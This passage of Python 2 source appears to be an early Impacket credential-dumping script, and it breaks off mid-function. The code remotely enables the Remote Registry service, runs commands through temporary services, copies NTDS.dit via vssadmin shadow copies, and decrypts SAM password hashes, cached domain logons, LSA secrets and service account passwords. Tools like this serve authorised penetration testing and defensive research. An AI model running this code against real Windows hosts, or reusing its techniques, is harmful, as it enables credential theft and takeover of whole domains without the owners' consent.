#!/usr/bin/python
# Copyright (c) 2003-2014 CORE Security Technologies
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# $Id$
#
# Description: Performs various techniques to dump hashes from the
#              remote machine without executing any agent there.
#              For SAM and LSA Secrets (including cached creds)
#              we try to read as much as we can from the registry
#              and then we save the hives in the target system (%SYSTEMROOT%\\Temp dir)
#              and read the rest of the data from there.
#              For NTDS.dit, we have to extract NTDS.dit via vssadmin executed
#              with the smbexec approach. It's copied on the temp dir and parsed
#              remotely.
#              The scripts initiates the services required for its working 
#              if they are not available (e.g. Remote Registry, even if it is 
#              disabled). After the work is done, things are restored to the 
#              original state.
#
# Author:
#  Alberto Solino
#
# References: Most of the work done by these guys. I just put all
#             the pieces together, plus some extra magic.
#
# http://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
# http://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
# http://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
# http://www.quarkslab.com/en-blog+read+13
# https://code.google.com/p/creddump/
# http://lab.mediaservice.net/code/cachedump.rb
# http://insecurety.net/?p=768
# http://www.beginningtoseethelight.org/ntsecurity/index.htm
# http://www.ntdsxtract.com/downloads/ActiveDirectoryOfflineHashDumpAndForensics.pdf
# http://www.passcape.com/index.php?section=blog&cmd=details&id=15
#
from impacket import version, smbconnection, winregistry, ntlm
from impacket.smbconnection import SMBConnection
from impacket.dcerpc import dcerpc, transport, winreg
from impacket.dcerpc.v5 import rpcrt, transport, rrp, scmr
from impacket.winregistry import hexdump
from impacket.structure import Structure
from impacket.ese import ESENT_DB
from struct import unpack, pack
import sys
import random
import hashlib
import argparse
import logging
import tempfile
import os
import traceback
import ntpath
import time
import string

try:
    from Crypto.Cipher import DES, ARC4, AES
    from Crypto.Hash import HMAC, MD4
except Exception:
    print "Warning: You don't have any crypto installed. You need PyCrypto"
    print "See http://www.pycrypto.org/"


# Structures
# Taken from http://insecurety.net/?p=768
class SAM_KEY_DATA(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Length','<L=0'),
        ('Salt','16s=""'),
        ('Key','16s=""'),
        ('CheckSum','16s=""'),
        ('Reserved','<Q=0'),
    )

class DOMAIN_ACCOUNT_F(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Unknown','<L=0'),
        ('CreationTime','<Q=0'),
        ('DomainModifiedCount','<Q=0'),
        ('MaxPasswordAge','<Q=0'),
        ('MinPasswordAge','<Q=0'),
        ('ForceLogoff','<Q=0'),
        ('LockoutDuration','<Q=0'),
        ('LockoutObservationWindow','<Q=0'),
        ('ModifiedCountAtLastPromotion','<Q=0'),
        ('NextRid','<L=0'),
        ('PasswordProperties','<L=0'),
        ('MinPasswordLength','<H=0'),
        ('PasswordHistoryLength','<H=0'),
        ('LockoutThreshold','<H=0'),
        ('Unknown2','<H=0'),
        ('ServerState','<L=0'),
        ('ServerRole','<H=0'),
        ('UasCompatibilityRequired','<H=0'),
        ('Unknown3','<Q=0'),
        ('Key0',':', SAM_KEY_DATA),
# Commenting this, not needed and not present on Windows 2000 SP0
#        ('Key1',':', SAM_KEY_DATA),
#        ('Unknown4','<L=0'),
    )

# Great help from here http://www.beginningtoseethelight.org/ntsecurity/index.htm
class USER_ACCOUNT_V(Structure):
    structure = (
        ('Unknown','12s=""'),
        ('NameOffset','<L=0'),
        ('NameLength','<L=0'),
        ('Unknown2','<L=0'),
        ('FullNameOffset','<L=0'),
        ('FullNameLength','<L=0'),
        ('Unknown3','<L=0'),
        ('CommentOffset','<L=0'),
        ('CommentLength','<L=0'),
        ('Unknown3','<L=0'),
        ('UserCommentOffset','<L=0'),
        ('UserCommentLength','<L=0'),
        ('Unknown4','<L=0'),
        ('Unknown5','12s=""'),
        ('HomeDirOffset','<L=0'),
        ('HomeDirLength','<L=0'),
        ('Unknown6','<L=0'),
        ('HomeDirConnectOffset','<L=0'),
        ('HomeDirConnectLength','<L=0'),
        ('Unknown7','<L=0'),
        ('ScriptPathOffset','<L=0'),
        ('ScriptPathLength','<L=0'),
        ('Unknown8','<L=0'),
        ('ProfilePathOffset','<L=0'),
        ('ProfilePathLength','<L=0'),
        ('Unknown9','<L=0'),
        ('WorkstationsOffset','<L=0'),
        ('WorkstationsLength','<L=0'),
        ('Unknown10','<L=0'),
        ('HoursAllowedOffset','<L=0'),
        ('HoursAllowedLength','<L=0'),
        ('Unknown11','<L=0'),
        ('Unknown12','12s=""'),
        ('LMHashOffset','<L=0'),
        ('LMHashLength','<L=0'),
        ('Unknown13','<L=0'),
        ('NTHashOffset','<L=0'),
        ('NTHashLength','<L=0'),
        ('Unknown14','<L=0'),
        ('Unknown15','24s=""'),
        ('Data',':=""'),
    )

class NL_RECORD(Structure):
    structure = (
        ('UserLength','<H=0'),
        ('DomainNameLength','<H=0'),
        ('EffectiveNameLength','<H=0'),
        ('FullNameLength','<H=0'),
        ('MetaData','52s=""'),
        ('FullDomainLength','<H=0'),
        ('Length2','<H=0'),
        ('CH','16s=""'),
        ('T','16s=""'),
        ('EncryptedData',':'),
    )


class SAMR_RPC_SID_IDENTIFIER_AUTHORITY(Structure):
    structure = (
        ('Value','6s'),
    )

class SAMR_RPC_SID(Structure):
    structure = (
        ('Revision','<B'),
        ('SubAuthorityCount','<B'),
        ('IdentifierAuthority',':',SAMR_RPC_SID_IDENTIFIER_AUTHORITY),
        ('SubLen','_-SubAuthority','self["SubAuthorityCount"]*4'),
        ('SubAuthority',':'),
    )

    def formatCanonical(self):
       ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority']['Value'][5]))
       for i in range(self['SubAuthorityCount']):
           ans += '-%d' % ( unpack('>L',self['SubAuthority'][i*4:i*4+4])[0])
       return ans

class LSA_SECRET_BLOB(Structure):
    structure = (
        ('Length','<L=0'),
        ('Unknown','12s=""'),
        ('_Secret','_-Secret','self["Length"]'),
        ('Secret',':'),
        ('Remaining',':'),
    )

class LSA_SECRET(Structure):
    structure = (
        ('Version','<L=0'),
        ('EncKeyID','16s=""'),
        ('EncAlgorithm','<L=0'),
        ('Flags','<L=0'),
        ('EncryptedData',':'),
    )

class LSA_SECRET_XP(Structure):
    structure = (
        ('Length','<L=0'),
        ('Version','<L=0'),
        ('_Secret','_-Secret', 'self["Length"]'),
        ('Secret', ':'),
    )

# Classes
class RemoteFile():
    def __init__(self, smbConnection, fileName):
        self.__smbConnection = smbConnection
        self.__fileName = fileName
        self.__tid = self.__smbConnection.connectTree('ADMIN$')
        self.__fid = None
        self.__currentOffset = 0

    def open(self):
        self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName)

    def seek(self, offset, whence):
        # Implement whence, for now it's always from the beginning of the file
        if whence == 0:
            self.__currentOffset = offset

    def read(self, bytesToRead):
        if bytesToRead > 0:
            data =  self.__smbConnection.readFile(self.__tid, self.__fid, self.__currentOffset, bytesToRead)
            self.__currentOffset += len(data)
            return data
        return ''

    def close(self):
        if self.__fid is not None:
            self.__smbConnection.closeFile(self.__tid, self.__fid)
            self.__smbConnection.deleteFile('ADMIN$', self.__fileName)
            self.__fid = None

    def tell(self):
        return self.__currentOffset

    def __str__(self):
        return "\\\\%s\\ADMIN$\\%s" % (self.__smbConnection.getRemoteHost(), self.__fileName)


class RemoteOperations:
    def __init__(self, smbConnection):
        self.__smbConnection = smbConnection
        self.__smbConnection.setTimeout(5*60)
        self.__serviceName = 'RemoteRegistry'
        self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
        self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
        self.__rrp = None
        self.__bootKey = ''
        self.__disabled = False
        self.__shouldStop = False
        self.__started = False
        self.__scmr = None
        self.__regHandle = None
        self.__batchFile = '%TEMP%\\execute.bat' 
        self.__shell = '%COMSPEC% /Q /c '
        self.__output = '%SYSTEMROOT%\\Temp\\__output'
        self.__answerTMP = ''
        self.__tmpServiceName = None
        self.__serviceDeleted = False

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __connectWinReg(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.__smbConnection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def getMachineNameAndDomain(self):
        return self.__smbConnection.getServerName(), self.__smbConnection.getServerDomain()

    def getDefaultLoginAccount(self):
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
            keyHandle = ans['phkResult']
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
            username = dataValue[:-1]
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, 'DefaultDomainName')
            domain = dataValue[:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
            if len(domain) > 0:
                return '%s\\%s' % (domain,username)
            else:
                return username
        except Exception, e:
            return None

    def getServiceAccount(self, serviceName):
        try:
            # Open the service
            ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, serviceName)
            serviceHandle = ans['lpServiceHandle']
            resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
            account = resp['lpServiceConfig']['lpServiceStartName'][:-1]
            scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
            if account.startswith('.\\'):
                account = account[2:]
            return account
        except Exception, e:
            logging.error(e)
            return None
 
    def __checkServiceStatus(self):
        # Open SC Manager
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Now let's open the service
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        # Let's check its status
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            logging.info('Service %s is in stopped state'% self.__serviceName)
            self.__shouldStop = True
            self.__started = False
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            logging.debug('Service %s is already running'% self.__serviceName)
            self.__shouldStop = False
            self.__started  = True
        else:
            raise Exception('Unknown service state 0x%x - Aborting' % ans['CurrentState'])

        # Let's check its configuration if service is stopped, maybe it's disabled :s
        if self.__started == False:
            ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                logging.info('Service %s is disabled, enabling it'% self.__serviceName)
                self.__disabled = True
                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
            logging.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
            time.sleep(1)

    def enableRegistry(self):
        self.__connectSvcCtl()
        self.__checkServiceStatus()
        self.__connectWinReg()

    def __restore(self):
        # First of all stop the service if it was originally stopped
        if self.__shouldStop is True:
            logging.info('Stopping service %s' % self.__serviceName)
            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
        if self.__disabled is True:
            logging.info('Restoring the disabled state for service %s' % self.__serviceName)
            scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
        if self.__serviceDeleted is False:
            # Check again the service we created does not exist, starting a new connection
            # Why?.. Hitting CTRL+C might break the whole existing DCE connection
            try:
                rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % self.__smbConnection.getRemoteHost())
                if hasattr(rpc, 'set_credentials'):
                    # This method exists only for selected protocol sequences.
                    rpc.set_credentials(*self.__smbConnection.getCredentials())
                self.__scmr = rpc.get_dce_rpc()
                self.__scmr.connect()
                self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
                # Open SC Manager
                ans = scmr.hROpenSCManagerW(self.__scmr)
                self.__scManagerHandle = ans['lpScHandle']
                # Now let's open the service
                scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName)
                service = resp['lpServiceHandle']
                scmr.hRDeleteService(self.__scmr, service)
                scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
                scmr.hRCloseServiceHandle(self.__scmr, service)
                scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
                scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                rpc.disconnect()
            except Exception, e:
                # If service is stopped it'll trigger an exception
                # If service does not exist it'll trigger an exception
                # So. we just wanna be sure we delete it, no need to 
                # show this exception message
                pass

    def finish(self):
        self.__restore()
        self.__rrp.disconnect()
        self.__scmr.disconnect()

    def getBootKey(self):
        bootKey = ''
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        for key in ['JD','Skew1','GBG','Data']:
            logging.debug('Retrieving class info for %s'% key)
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
            keyHandle = ans['phkResult']
            ans = rrp.hBaseRegQueryInfoKey(self.__rrp,keyHandle)
            bootKey = bootKey + ans['lpClassOut'][:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        bootKey = bootKey.decode('hex')

        for i in xrange(len(bootKey)):
            self.__bootKey += bootKey[transforms[i]]

        logging.info('Target system bootKey: 0x%s' % self.__bootKey.encode('hex'))

        return self.__bootKey

    def checkNoLMHashPolicy(self):
        logging.debug('Checking NoLMHash Policy')
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']

        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa')
        keyHandle = ans['phkResult']
        try: 
            dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
        except:
            noLMHash = 0

        if noLMHash != 1:
            logging.debug('LMHashes are being stored')
            return False

        logging.debug('LMHashes are NOT being stored')
        return True

    def __retrieveHive(self, hiveName):
        tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hiveName)
        except:
            raise Exception("Can't open %s hive" % hiveName)
        keyHandle = ans['phkResult']
        resp = rrp.hBaseRegSaveKey(self.__rrp, keyHandle, tmpFileName)
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
        # Now let's open the remote file, so it can be read later
        remoteFileName = RemoteFile(self.__smbConnection, 'SYSTEM32\\'+tmpFileName)
        return remoteFileName

    def saveSAM(self):
        logging.debug('Saving remote SAM database')
        return self.__retrieveHive('SAM')

    def saveSECURITY(self):
        logging.debug('Saving remote SECURITY database')
        return self.__retrieveHive('SECURITY')

    def __executeRemote(self, data):
        self.__tmpServiceName = ''.join([random.choice(string.letters) for i in range(8)]).encode('utf-16le')
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
        command += ' & ' + 'del ' + self.__batchFile 

        self.__serviceDeleted = False
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']
        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        self.__serviceDeleted = True
        scmr.hRCloseServiceHandle(self.__scmr, service)
    def __answer(self, data):
        self.__answerTMP += data

    def __getLastVSS(self):
        self.__executeRemote('%COMSPEC% /C vssadmin list shadows')
        time.sleep(5)
        tries = 0
        while True:
            try:
                self.__smbConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                break
            except Exception, e:
                if tries > 30:
                    # We give up
                    raise Exception('Too many tries trying to list vss shadows')
                if str(e).find('SHARING') > 0:
                    # Stuff didn't finish yet.. wait more
                    time.sleep(5)
                    tries +=1
                    pass
                else:
                    raise

        lines = self.__answerTMP.split('\n')
        lastShadow = ''
        # Let's find the last one
        for line in lines:
           if line.find('GLOBALROOT') > 0:
               lastShadow = line[line.find('\\\\?'):][:-1]

        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')

        return lastShadow

    def saveNTDS(self):
        logging.info('Searching for NTDS.dit')
        # First of all, see if NTDS is at the target server
        tid = self.__smbConnection.connectTree('ADMIN$')
        try:
            fid = self.__smbConnection.openFile(tid, 'NTDS\\ntds.dit')
        except Exception, e:
            if str(e).find('NOT_FOUND') > 0:
               return None

        logging.info('NTDS.dit found. Calling vssadmin to get a copy. This might take some time')
        # Get the list of remote shadows
        shadow = self.__getLastVSS()
        if shadow == '':
            # No shadow, create one
            self.__executeRemote('%COMSPEC% /C vssadmin create shadow /For=%SYSTEMDRIVE%')
            shadow = self.__getLastVSS()
            shouldRemove = True
            if shadow == '':
                raise Exception('Could not get a VSS')
        else:
            shouldRemove = False

        # Now copy the ntds.dit to the temp directory
        tmpFileName = ''.join([random.choice(string.letters) for i in range(8)]) + '.tmp'

        self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\NTDS\\ntds.dit %%SYSTEMROOT%%\\Temp\\%s' % (shadow, tmpFileName))
      
        if shouldRemove is True:
            self.__executeRemote('%COMSPEC% /C vssadmin delete shadows /For=%SYSTEMDRIVE% /Quiet')

        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')

        remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)

        return remoteFileName

class CryptoCommon:
    # Common crypto stuff used over different classes
    def transformKey(self, InputKey):
        # Section 2.2.11.1.2 Encrypting a 64-Bit Block with a 7-Byte Key
        OutputKey = []
        OutputKey.append( chr(ord(InputKey[0]) >> 0x01) )
        OutputKey.append( chr(((ord(InputKey[0])&0x01)<<6) | (ord(InputKey[1])>>2)) )
        OutputKey.append( chr(((ord(InputKey[1])&0x03)<<5) | (ord(InputKey[2])>>3)) )
        OutputKey.append( chr(((ord(InputKey[2])&0x07)<<4) | (ord(InputKey[3])>>4)) )
        OutputKey.append( chr(((ord(InputKey[3])&0x0F)<<3) | (ord(InputKey[4])>>5)) )
        OutputKey.append( chr(((ord(InputKey[4])&0x1F)<<2) | (ord(InputKey[5])>>6)) )
        OutputKey.append( chr(((ord(InputKey[5])&0x3F)<<1) | (ord(InputKey[6])>>7)) )
        OutputKey.append( chr(ord(InputKey[6]) & 0x7F) )

        for i in range(8):
            OutputKey[i] = chr((ord(OutputKey[i]) << 1) & 0xfe)

        return "".join(OutputKey)

    def deriveKey(self, baseKey):
        # 2.2.11.1.3 Deriving Key1 and Key2 from a Little-Endian, Unsigned Integer Key
        # Let I be the little-endian, unsigned integer.
        # Let I[X] be the Xth byte of I, where I is interpreted as a zero-base-index array of bytes.
        # Note that because I is in little-endian byte order, I[0] is the least significant byte.
        # Key1 is a concatenation of the following values: I[0], I[1], I[2], I[3], I[0], I[1], I[2].
        # Key2 is a concatenation of the following values: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
        key = pack('<L',baseKey)
        key1 = key[0] + key[1] + key[2] + key[3] + key[0] + key[1] + key[2]
        key2 = key[3] + key[0] + key[1] + key[2] + key[3] + key[0] + key[1]
        return self.transformKey(key1),self.transformKey(key2)

    
class OfflineRegistry:
    def __init__(self, hiveFile = None, isRemote = False):
        self.__hiveFile = hiveFile
        if self.__hiveFile is not None:
            self.__registryHive = winregistry.Registry(self.__hiveFile, isRemote)

    def enumKey(self, searchKey):
        parentKey = self.__registryHive.findKey(searchKey)

        if parentKey is None:
            return

        keys = self.__registryHive.enumKey(parentKey)

        return keys

    def enumValues(self, searchKey):
        key = self.__registryHive.findKey(searchKey)

        if key is None:
            return

        values = self.__registryHive.enumValues(key)

        return values

    def getValue(self, keyValue):
        value = self.__registryHive.getValue(keyValue)

        if value is None:
            return

        return value

    def getClass(self, className):
        value = self.__registryHive.getClass(className)

        if value is None:
            return

        return value

    def finish(self):
        if self.__hiveFile is not None:
            # Remove temp file and whatever else is needed
            self.__registryHive.close()

class SAMHashes(OfflineRegistry):
    def __init__(self, samFile, bootKey, isRemote = False):
        OfflineRegistry.__init__(self, samFile, isRemote)
        self.__samFile = samFile
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def getHBootKey(self):
        logging.debug('Calculating HashedBootKey from SAM')
        QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
        DIGITS = "0123456789012345678901234567890123456789\0"

        F = self.getValue(ntpath.join('SAM\Domains\Account','F'))[1]

        domainData = DOMAIN_ACCOUNT_F(F)

        rc4Key = self.MD5(domainData['Key0']['Salt'] + QWERTY + self.__bootKey + DIGITS)

        rc4 = ARC4.new(rc4Key)
        self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key']+domainData['Key0']['CheckSum'])

        # Verify key with checksum
        checkSum = self.MD5( self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)

        if checkSum != self.__hashedBootKey[16:]:
            raise Exception('hashedBootKey CheckSum failed!')

    def __decryptHash(self, rid, cryptedHash, constant):
        # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
        # plus hashedBootKey stuff
        Key1,Key2 = self.__cryptoCommon.deriveKey(rid)

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        rc4Key = self.MD5( self.__hashedBootKey[:0x10] + pack("<L",rid) + constant )
        rc4 = ARC4.new(rc4Key)
        key = rc4.encrypt(cryptedHash)

        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

        return decryptedHash

    def dump(self):
        NTPASSWORD = "NTPASSWORD\0"
        LMPASSWORD = "LMPASSWORD\0"

        if self.__samFile is None:
            # No SAM file provided
            return

        logging.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
        self.getHBootKey()

        usersKey = 'SAM\\Domains\\Account\\Users'

        # Enumerate all the RIDs
        rids = self.enumKey(usersKey)
        # Remove the Names item
        try:
            rids.remove('Names')
        except:
            pass

        for rid in rids:
            userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
            rid = int(rid,16)

            baseOffset = len(USER_ACCOUNT_V())

            V = userAccount['Data']

            userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

            if userAccount['LMHashLength'] == 20:
                encLMHash = V[userAccount['LMHashOffset']+4:userAccount['LMHashOffset']+userAccount['LMHashLength']]
            else:
                encLMHash = ''

            if userAccount['NTHashLength'] == 20:
                encNTHash = V[userAccount['NTHashOffset']+4:userAccount['NTHashOffset']+userAccount['NTHashLength']]
            else:
                encNTHash = ''

            lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD)
            ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD)

            if lmHash == '':
                lmHash = ntlm.LMOWFv1('','')
            if ntHash == '':
                ntHash = ntlm.NTOWFv1('','')

            answer =  "%s:%d:%s:%s:::" % (userName, rid, lmHash.encode('hex'), ntHash.encode('hex'))
            self.__itemsFound[rid] = answer
            print answer

    def export(self, fileName):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fd = open(fileName+'.sam','w+')
            for item in items:
                fd.write(self.__itemsFound[item]+'\n')
            fd.close()


class LSASecrets(OfflineRegistry):
    def __init__(self, securityFile, bootKey, remoteOps = None, isRemote = False):
        OfflineRegistry.__init__(self,securityFile, isRemote)
        self.__hashedBootKey = ''
        self.__bootKey = bootKey
        self.__LSAKey = ''
        self.__NKLMKey = ''
        self.__isRemote = isRemote
        self.__vistaStyle = True
        self.__cryptoCommon = CryptoCommon()
        self.__securityFile = securityFile
        self.__remoteOps = remoteOps
        self.__cachedItems = []
        self.__secretItems = []

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def __sha256(self, key, value, rounds=1000):
        sha = hashlib.sha256()
        sha.update(key)
        for i in range(1000):
            sha.update(value)
        return sha.digest()

    def __decryptAES(self, key, value, iv='\x00'*16):
        plainText = ''
        if iv != '\x00'*16:
            aes256 = AES.new(key,AES.MODE_CBC, iv)

        for index in range(0, len(value), 16):
            if iv == '\x00'*16:
                aes256 = AES.new(key,AES.MODE_CBC, iv)
            cipherBuffer = value[index:index+16]
            # Pad buffer to 16 bytes
            if len(cipherBuffer) < 16:
                cipherBuffer += '\x00' * (16-len(cipherBuffer))
            plainText += aes256.decrypt(cipherBuffer)

        return plainText

    def __decryptSecret(self, key, value):
        # [MS-LSAD] Section 5.1.2
        plainText = ''
        key0 = key
        for i in range(0, len(value), 8):
            cipherText = value[:8]
            tmpStrKey = key0[:7]
            tmpKey = self.__cryptoCommon.transformKey(tmpStrKey)
            Crypt1 = DES.new(tmpKey, DES.MODE_ECB)
            plainText += Crypt1.decrypt(cipherText) 
            cipherText = cipherText[8:]
            key0 = key0[7:]
            value = value[8:]
            # AdvanceKey
            if len(key0) < 7:
                key0 = key[len(key0):]

        secret = LSA_SECRET_XP(plainText)
        return (secret['Secret'])

    def __decryptHash(self, key, value, iv):
        hmac_md5 = HMAC.new(key,iv)
        rc4key = hmac_md5.digest()
    
        rc4 = ARC4.new(rc4key)
        data = rc4.encrypt(value)
        return data

    def __decryptLSA(self, value):
        if self.__vistaStyle is True:
            # ToDo: There could be more than one LSA Keys
            record = LSA_SECRET(value)
            tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
            plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
            record = LSA_SECRET_BLOB(plainText)
            self.__LSAKey = record['Secret'][52:][:32]
  
        else:
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(value[60:76])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.decrypt(value[12:60])
            self.__LSAKey = plainText[0x10:0x20]

    def __getLSASecretKey(self):
        logging.debug('Decrypting LSA Key')
        # Let's try the key post XP
        value = self.getValue('\\Policy\\PolEKList\\default')
        if value is None:
            logging.debug('PolEKList not found, trying PolSecretEncryptionKey')
            # Second chance
            value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
            self.__vistaStyle = False
            if value is None:
                # No way :(
                return None

        self.__decryptLSA(value[1])

    def __getNLKMSecret(self):
        logging.debug('Decrypting NL$KM')
        value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
        if value is None:
            raise Exception("Couldn't get NL$KM value")
        if self.__vistaStyle is True:
            record = LSA_SECRET(value[1])
            tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
            self.__NKLMKey = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
        else:
            self.__NKLMKey = self.__decryptSecret(self.__LSAKey,value[1][0xc:])

    def __pad(self, data):
        if (data & 0x3) > 0:
            return data + (data & 0x3)
        else:
            return data

    def dumpCachedHashes(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        logging.info('Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)')

        # Let's first see if there are cached entries
        values = self.enumValues('\\Cache')
        if values == None:
            # No cache entries
            return
        try:
            # Remove unnecesary value
            values.remove('NL$Control')
        except:
            pass

        self.__getLSASecretKey()
        self.__getNLKMSecret()

        for value in values:
            logging.debug('Looking into %s' % value)
            record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value))[1])
            if record['CH'] != 16 * '\x00':
                if self.__vistaStyle is True:
                    plainText = self.__decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['CH'])
                else:
                    plainText = self.__decryptHash(self.__NKLMKey, record['EncryptedData'], record['CH'])
                    pass
                encHash = plainText[:0x10]
                plainText = plainText[0x48:]
                userName = plainText[:record['UserLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['UserLength']):]
                domain = plainText[:record['DomainNameLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['DomainNameLength']):]
                domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
                answer = "%s:%s:%s:%s:::" % (userName, encHash.encode('hex'), domainLong, domain)
                self.__cachedItems.append(answer)
                print answer

    def __printSecret(self, name, secretItem):
        # Based on [MS-LSAD] section 3.1.1.4

        # First off, let's discard NULL secrets.
        if len(secretItem) == 0:
            logging.debug('Discarding secret %s, NULL Data' % name)
            return

        # We might have secrets with zero
        if secretItem.startswith('\x00\x00'):
            logging.debug('Discarding secret %s, all zeros' % name)
            return

        upperName = name.upper()

        logging.info('%s ' % name)

        secret = ''

        if upperName.startswith('_SC_'):
            # Service name, a password might be there
            # Let's first try to decode the secret
            try: 
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account the service
                # runs under
                if self.__isRemote is True:
                    account = self.__remoteOps.getServiceAccount(name[4:])
                    if account is None:
                        secret = '(Unknown User):'
                    else:
                        secret =  "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = '(Unknown User):',
                secret += strDecoded       
